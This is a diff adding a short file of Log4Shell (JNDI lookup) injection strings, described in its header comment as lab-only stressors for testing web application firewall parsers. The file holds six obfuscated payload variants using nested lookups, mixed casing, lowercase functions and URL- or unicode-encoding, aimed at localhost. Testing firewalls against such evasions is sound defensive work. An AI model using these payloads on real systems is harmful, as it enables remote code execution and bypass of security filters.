@@ -1,0 +1,9 @@
+# Lab-only nesting / casing / homoglyph stressors for WAAP parsers (--lab-mode).
+# Do NOT point at unfamiliar production tenants.
+
+j${${::-}n${::-}d${::-}i}:${::-}l/${::-}d/${::-}a/${::-}p
+${JnDi:lds://127.0.0.1:389/x}
+%u0024%uu007bjndi%u003Aldap%u003a/
+${${lower:jndi}:${lower:l}${lower:d}a${lower:p}:/127.0.0.1}
+%24%257bjndi:ldap:${::-}%2f127.0.0.1%257d
+\u0024\u007bjndi:\u006c\u0064\u0061\u0070\u003a\u002f\u002fx\u007d
